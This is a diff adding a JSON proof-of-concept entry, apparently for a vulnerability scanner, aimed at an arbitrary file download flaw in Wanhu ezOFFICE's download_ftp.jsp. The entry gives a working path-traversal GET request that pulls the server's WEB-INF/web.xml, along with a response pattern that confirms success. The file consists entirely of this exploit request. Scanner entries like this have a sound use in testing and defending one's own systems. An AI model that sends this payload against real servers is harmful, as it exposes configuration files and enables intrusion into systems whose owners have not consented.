@@ -1,0 +1,14 @@
+{
+	"name":"万户-ezOFFICE-download_ftp.jsp任意文件下载",
+	"tag":"wanhu",
+	"type":"other",
+	"poc":{
+		"pocGet":"/defaultroot/download_ftp.jsp?path=/../WEB-INF/&name=aaa&FileName=web.xml",
+		"header":{
+			"User-Agent":"Mozilla/5.0 (Linux;",
+			"content-type":"text/plain"
+		},
+		"status_code":"200",
+		"pattern":"(filter-class)"
+	}
+}
